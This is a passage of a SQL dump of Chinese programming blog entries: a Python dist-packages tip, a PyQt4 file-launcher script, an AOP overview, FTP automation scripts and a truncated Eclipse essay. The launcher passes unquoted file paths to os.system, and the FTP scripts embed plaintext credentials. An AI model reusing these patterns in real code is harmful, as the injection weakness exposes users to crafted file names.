install','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(362,'python2.6的site-packages改名为dist-packages','33731937201051683627407',2,'2010-06-16 20:36:27',NULL,'2010-06-16 20:36:27','2014-07-13 18:57:26','python2.5的新包都放在site-packages目录下，但是在python2.6改放在dist-packages目录下，site-packages不再是默认的目录<br />而thrift默认安装在site-packages目录下，所以如果在python2.6的环境下安装Thrift，安装完成后，要将site-packages目录下的文件移动到dist-packages目录下<br />sudo mv /usr/lib/python2.6/site-packages /usr/lib/python2.6/dist-packages<br />Ubuntu8.04和8.10默认是python2.5环境<br />Ubuntu10.04是python2.6的环境',1,1,1,0,0,0,'python2.5的新包都放在site-packages目录下，但是在python2.6改放在dist-packages目录下，site-packages不再是默认的目录而thrift默认安装在site-packages目录下，所以如果在python2.6的环境下安装Thrift，安装完成后，要将site-packages目录下的文件移动到dist-packages目录下sudo mv /usr/lib/python2.6/site-packages /usr/lib/python2.6/dist-packagesUbuntu8.04和8.10默认是python2.5环境Ubuntu10.04是python2.6的环境','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(363,'PyStart快速启动','337319372009101934630941',2,'2009-11-19 15:46:30',NULL,'2009-11-19 15:46:30','2014-07-13 18:57:26','Todo:<br />1. 解决Topmost时Combox不能显示的问题<br />2. 自动隐藏<br />3. 记录历史位置和历史大小<br /><br />from PyQt4.QtGui import *<br />from PyQt4.QtCore import *<br />import sys,os,pickle<br /><br />class PyStart(QDialog):<br />&nbsp;&nbsp;&nbsp; def __init__(self,favorites=None):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; QWidget.__init__(self)<br /><br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.dirs=QDirModel()<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders=QListView()<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setModel(self.dirs)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setContextMenuPolicy(Qt.CustomContextMenu); <br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setViewMode(QListView.IconMode)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.favor=favorites<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.lblRate=QLabel()<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath=QComboBox()<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.setEditable(True)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; for x in self.favor.getFavorites():<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.insertItem(0,QString(x))<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #TODO:add favorites to lineedit<br /><br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; layout=QGridLayout(self)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; head=QFormLayout()<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; head.addRow(self.lblRate, self.curPath)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; layout.addLayout(head,0,0)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; layout.addWidget(self.folders,1,0)<br /><br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #self.connect(self.folders, SIGNAL(\'customContextMenuRequested (const QPoint&amp;)\'),self.slotContextMenu)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.selectionChanged=self.slotSelectionChanged<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(self.curPath, SIGNAL(\'currentIndexChanged (const QString&amp;)\'),self.slotUpdatePath)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(self.curPath, SIGNAL(\'editTextChanged (const QString&amp;)\'),self.slotChangeFolder)<br />#&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.setWindowFlags(self.windowFlags()|Qt.WindowStaysOnTopHint)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.show()<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.setCurrentIndex(0)<br /><br />&nbsp;&nbsp;&nbsp; \'\'\'context menu<br />&nbsp;&nbsp;&nbsp; for view setting<br />&nbsp;&nbsp;&nbsp; \'\'\'<br />&nbsp;&nbsp;&nbsp; def contextMenuEvent(self,evt):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu = QMenu()<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addSeparator()<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; actIcon=QAction(\"IconView\", menu);<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; actList=QAction(\"ListView\",menu)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; actClear=QAction(\"ClearHistory\",menu)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(actIcon,SIGNAL(\'triggered()\'), lambda : self.folders.setViewMode(QListView.IconMode))<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(actList,SIGNAL(\'triggered()\'), lambda : self.folders.setViewMode(QListView.ListMode))<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(actClear,SIGNAL(\'triggered()\'), self.slotClearHistory)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addAction(actIcon)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addAction(actList)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addAction(actClear)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.exec_(evt.globalPos())<br />&nbsp;&nbsp;&nbsp; def slotUpdatePath(self, path):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.lblRate.setText(QString.number(self.favor.incFavorite(path)))<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setRootIndex(self.dirs.index(path))<br />&nbsp;&nbsp;&nbsp; def slotChangeFolder(self,text):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(text[-1]==os.path.sep and os.path.exists(text)):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #todo automatically list selectable items<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; print \'ok\'<br />&nbsp;&nbsp;&nbsp; def slotClearHistory(self):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.clear()<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.favor.clear()<br />&nbsp;&nbsp;&nbsp; \'\'\'click a list item, and open folder or open file<br />&nbsp;&nbsp;&nbsp; \'\'\'<br />&nbsp;&nbsp;&nbsp; def slotSelectionChanged(self,selected,dselected):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; destFile=self.dirs.fileInfo(selected.indexes()[0])<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=unicode(destFile.absoluteFilePath())<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if sys.platform==\'win32\':<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=oscmd.replace(\'/\',\'\\\\\')<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(destFile.isDir()):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd = \"start explorer \"+oscmd<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=\"start \"+oscmd<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(destFile.isDir()):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=oscmd+\"&amp;\"<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=oscmd+\"&amp;\"<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; os.system(oscmd)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.selectionModel().reset()<br />&nbsp;&nbsp;&nbsp; \'\'\'when resized, the layout of listview is corrupt, so use this to fix it<br />&nbsp;&nbsp;&nbsp; \'\'\'<br />&nbsp;&nbsp;&nbsp; def resizeEvent(self,evt):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setViewMode(self.folders.viewMode())<br />&nbsp;&nbsp;&nbsp; def closeEvent(self,evt):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.favor.save()<br /><br />class Favorite():<br />&nbsp;&nbsp;&nbsp; def __init__(self,fileName=\'qw.hjz\'):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.fileName=fileName<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(os.path.isfile(fileName)):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; try:<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data=pickle.load(open(self.fileName))<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; except:<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data={}<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data={}<br />&nbsp;&nbsp;&nbsp; def getFavorites(self):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return sorted(self.data.keys(),key=lambda(k):self.data[k])<br />&nbsp;&nbsp;&nbsp; def getFavorite(self,item):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; items=unicode(item)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return self.data[item]<br />&nbsp;&nbsp;&nbsp; def incFavorite(self,item):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; item=unicode(item)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data.setdefault(item,0)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data[item]+=1<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return self.data[item]<br />&nbsp;&nbsp;&nbsp; def clear(self):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data={}<br />&nbsp;&nbsp;&nbsp; def save(self):<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; pickle.dump(self.data,open(self.fileName,\'w\'))<br /><br />if __name__==\'__main__\':<br />&nbsp;&nbsp;&nbsp; app=QApplication([])<br />&nbsp;&nbsp;&nbsp; favorites=Favorite()<br />&nbsp;&nbsp;&nbsp; dlg=PyStart(favorites)&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; app.setActiveWindow(dlg)<br />&nbsp;&nbsp;&nbsp; app.exec_()<br /><br />',1,1,1,0,0,0,'Todo:1. 解决Topmost时Combox不能显示的问题2. 自动隐藏3. 记录历史位置和历史大小from PyQt4.QtGui import *from PyQt4.QtCore import *import sys,os,pickleclass PyStart(QDialog):&nbsp;&nbsp;&nbsp; def __init__(self,favorites=None):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; QWidget.__init__(self)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.dirs=QDirModel()&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders=QListView()&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setModel(self.dirs)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setContextMenuPolicy(Qt.CustomContextMenu); &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setViewMode(QListView.IconMode)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.favor=favorites&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.lblRate=QLabel()&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath=QComboBox()&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.setEditable(True)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; for x in self.favor.getFavorites():&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.insertItem(0,QString(x))&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #TODO:add favorites to lineedit&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; layout=QGridLayout(self)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; head=QFormLayout()&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; head.addRow(self.lblRate, self.curPath)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; layout.addLayout(head,0,0)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; layout.addWidget(self.folders,1,0)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #self.connect(self.folders, SIGNAL(\'customContextMenuRequested (const QPoint&amp;)\'),self.slotContextMenu)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.selectionChanged=self.slotSelectionChanged&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(self.curPath, SIGNAL(\'currentIndexChanged (const QString&amp;)\'),self.slotUpdatePath)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(self.curPath, SIGNAL(\'editTextChanged (const QString&amp;)\'),self.slotChangeFolder)#&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.setWindowFlags(self.windowFlags()|Qt.WindowStaysOnTopHint)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.show()&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.setCurrentIndex(0)&nbsp;&nbsp;&nbsp; \'\'\'context menu&nbsp;&nbsp;&nbsp; for view setting&nbsp;&nbsp;&nbsp; \'\'\'&nbsp;&nbsp;&nbsp; def contextMenuEvent(self,evt):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu = QMenu()&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addSeparator()&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; actIcon=QAction(\"IconView\", menu);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; actList=QAction(\"ListView\",menu)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; actClear=QAction(\"ClearHistory\",menu)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(actIcon,SIGNAL(\'triggered()\'), lambda : self.folders.setViewMode(QListView.IconMode))&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(actList,SIGNAL(\'triggered()\'), lambda : self.folders.setViewMode(QListView.ListMode))&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(actClear,SIGNAL(\'triggered()\'), self.slotClearHistory)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addAction(actIcon)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addAction(actList)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addAction(actClear)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.exec_(evt.globalPos())&nbsp;&nbsp;&nbsp; def slotUpdatePath(self, path):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.lblRate.setText(QString.number(self.favor.incFavorite(path)))&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setRootIndex(self.dirs.index(path))&nbsp;&nbsp;&nbsp; def slotChangeFolder(self,text):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(text[-1]==os.path.sep and os.path.exists(text)):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #todo automatically list selectable items&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; print \'ok\'&nbsp;&nbsp;&nbsp; def slotClearHistory(self):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.clear()&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.favor.clear()&nbsp;&nbsp;&nbsp; \'\'\'click a list item, and open folder or open file&nbsp;&nbsp;&nbsp; \'\'\'&nbsp;&nbsp;&nbsp; def slotSelectionChanged(self,selected,dselected):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; destFile=self.dirs.fileInfo(selected.indexes()[0])&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=unicode(destFile.absoluteFilePath())&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if sys.platform==\'win32\':&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=oscmd.replace(\'/\',\'\\\\\')&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(destFile.isDir()):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd = \"start explorer \"+oscmd&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=\"start \"+oscmd&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(destFile.isDir()):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=oscmd+\"&amp;\"&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=oscmd+\"&amp;\"&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; os.system(oscmd)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.selectionModel().reset()&nbsp;&nbsp;&nbsp; \'\'\'when resized, the layout of listview is corrupt, so use this to fix it&nbsp;&nbsp;&nbsp; \'\'\'&nbsp;&nbsp;&nbsp; def resizeEvent(self,evt):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setViewMode(self.folders.viewMode())&nbsp;&nbsp;&nbsp; def closeEvent(self,evt):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.favor.save()class Favorite():&nbsp;&nbsp;&nbsp; def __init__(self,fileName=\'qw.hjz\'):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.fileName=fileName&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(os.path.isfile(fileName)):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; try:&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data=pickle.load(open(self.fileName))&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; except:&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data={}&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data={}&nbsp;&nbsp;&nbsp; def getFavorites(self):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return sorted(self.data.keys(),key=lambda(k):self.data[k])&nbsp;&nbsp;&nbsp; def getFavorite(self,item):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; items=unicode(item)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return self.data[item]&nbsp;&nbsp;&nbsp; def incFavorite(self,item):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; item=unicode(item)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data.setdefault(item,0)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data[item]+=1&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return self.data[item]&nbsp;&nbsp;&nbsp; def clear(self):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.data={}&nbsp;&nbsp;&nbsp; def save(self):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; pickle.dump(self.data,open(self.fileName,\'w\'))if __name__==\'__main__\':&nbsp;&nbsp;&nbsp; app=QApplication([])&nbsp;&nbsp;&nbsp; favorites=Favorite()&nbsp;&nbsp;&nbsp; dlg=PyStart(favorites)&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; app.setActiveWindow(dlg)&nbsp;&nbsp;&nbsp; app.exec_()','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(364,'面向特征的编程AOP','3373193720084411151115',2,'2008-05-04 23:01:51',NULL,'2008-05-04 23:01:51','2014-07-13 18:57:26','<p style=\"TEXT-INDENT: 2em;\">目前编程中最热门的新概念是面向特征的编程（aspect-oriented programming，AOP）。AOP曾经主要用于学术和研发机构，如今开始进入主流开发领域。与OOP在面向过程的编程方法基础上的改进一样，AOP是在<a href=\"http://wiki.matrix.org.cn/Wiki.jsp?page=%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B\" rel=\"nofollow\">面向对象编程</a>（OOP）方法的基础上进行改进而来的一种创新的软件开发方法。OOP引入了封装、继承和多态性等概念来建立一种对象层次结构，用以模拟公共行为的一个集合。然而，OOP在处理范围扩展到一些无关对象的公共行为方面达不到要求。也就是说，OOP允许你定义从上到下的关系，但并不适合定义从左到右的关系。例如，看一下日志功能。日志代码往往水平地散布在所有对象层次中，而与它所散布到的对象的核心功能毫无关系。对于其他类型的代码，如安全性、异常处理和透明的持续性也是如此。这种散布在各处的无关的代码被称为横切（<a href=\"http://wiki.matrix.org.cn/Wiki.jsp?page=CrossCutting%E5%85%B3%E7%B3%BB\" rel=\"nofollow\">cross-cutting</a><img alt=\"面向特征的编程AOP - hankjin - 云水居\" border=\"0\" src=\"http://wiki.matrix.org.cn/templates/brushed/scripts/iepngfix-blank.gif\" title=\"面向特征的编程AOP - hankjin - 云水居\" />）代码，这也是AOP编码方法产生的原因。 </p>  <p style=\"TEXT-INDENT: 2em;\">AOP提供一种提取横切代码的方法，这种横切代码横跨各个对象层次，但与它所跨越的对象代码在功能上没有相关性。AOP不是在类中嵌入横切代码，而是允许你将横切代码提取到一个单独的模块中，然后在需要的时候动态地应用该代码，这个单独的模块叫做一个“特征代码”（“aspect”，也译作“标记”）。通过在你的对象模型中需要应用横切代码的地方定义特定的位置–切入点（pointcut）–来实现动态的应用横切代码。在运行或编译时，根据你的<a href=\"http://wiki.matrix.org.cn/Wiki.jsp?page=AOP%E6%A1%86%E6%9E%B6\" rel=\"nofollow\">AOP框架</a>，横切代码被插入指定的切入点。本质上说，AOP允许你在对象中引入新功能，而对象无需了解所引入的功能。这是一个非常有用的概念。 </p>  <p style=\"TEXT-INDENT: 2em;\">AOP框架.实现:</p>  <p style=\"TEXT-INDENT: 2em;\">Aspectj</p>  <p style=\"TEXT-INDENT: 2em;\">JbossAop</p>  <p style=\"TEXT-INDENT: 2em;\">Caesarj</p>  <p style=\"TEXT-INDENT: 2em;\">ObjectTeamsForJava</p>',1,1,1,0,0,0,'目前编程中最热门的新概念是面向特征的编程（aspect-oriented programming，AOP）。AOP曾经主要用于学术和研发机构，如今开始进入主流开发领域。与OOP在面向过程的编程方法基础上的改进一样，AOP是在面向对象编程（OOP）方法的基础上进行改进而来的一种创新的软件开发方法。OOP引入了封装、继承和多态性等概念来建立一种对象层次结构，用以模拟公共行为的一个集合。然而，OOP在处理范围扩展到一些无关对象的公共行为方面达不到要求。也就是说，OOP允许你定义从上到下的关系，但并不适合定义从左到右的关系。例如，看一下日志功能。日志代码往往水平地散布在所有对象层次中，而与它所散布到的对象的核心功能毫无关系。对于其他类型的代码，如安全性、异常处理和透明的持续性也是如此。这种散布在各处的无关的代码被称为横切（cross-cutting）代码，这也是AOP编码方法产生的原因。   AOP提供一种提取横切代码的方法，这种横切代码横跨各个对象层次，但与它所跨越的对象代码在功能上没有相关性。AOP不是在类中嵌入横切代码，而是允许你将横切代码提取到一个单独的模块中，然后在需要的时候动态地应用该代码，这个单独的模块叫做一个“特征代码”（“aspect”，也译作“标记”）。通过在你的对象模型中需要应用横切代码的地方定义特定的位置–切入点（pointcut）–来实现动态的应用横切代码。在运行或编译时，根据你的AOP框架，横切代码被插入指定的切入点。本质上说，AOP允许你在对象中引入新功能，而对象无需了解所引入的功能。这是一个非常有用的概念。   AOP框架.实现:  Aspectj  JbossAop  Caesarj  ObjectTeamsForJava','',0,'j2ee',0,'','zinnia/_entry_detail.html','entry_detail.html'),(365,'使用批处理和ftp自动上传和下载文件','337319372007102734729243',2,'2007-11-27 15:47:29',NULL,'2007-11-27 15:47:29','2014-07-13 18:57:26','@echo off <br />open hankjin.vicp.net&gt; DownFromFtp.tmp&nbsp;<br />ftpusername &gt;&gt; DownFromFtp.tmp&nbsp;<br />ftppassword &gt;&gt; DownFromFtp.tmp <br />get&nbsp;list.tar.gz D:\\ftplist.tar.gz &gt;&gt; DownFromFtp.tmp <br />bye &gt;&gt; DownFromFtp.tmp <br />ftp -s:DownFromFtp.tmp <br />del DownFromFtp.tmp<br /><br />#!/bin/bash<br />ftp -in myserver.com &lt;&lt;EOF<br />user hankjin mypass<br />get backup.tar.gz<br />bye<br />EOF',1,1,1,0,0,0,'@echo off open hankjin.vicp.net&gt; DownFromFtp.tmp&nbsp;ftpusername &gt;&gt; DownFromFtp.tmp&nbsp;ftppassword &gt;&gt; DownFromFtp.tmp get&nbsp;list.tar.gz D:\\ftplist.tar.gz &gt;&gt; DownFromFtp.tmp bye &gt;&gt; DownFromFtp.tmp ftp -s:DownFromFtp.tmp del DownFromFtp.tmp#!/bin/bashftp -in myserver.com &lt;&lt;EOFuser hankjin mypassget backup.tar.gzbyeEOF','',0,'admin',0,'','zinnia/_entry_detail.html','entry_detail.html'),(366,'从WPF与Eclipse看软件企业策略','33731937200956104647276',2,'2009-06-06 10:46:47',NULL,'2009-06-06 10:46:47','2014-07-13 18:57:26','Eclipse的产生有一个故事，<br />传说很早很早以前，IBM使用VisuralAge for Java作为swt等的开发平台，Websphere Application Server 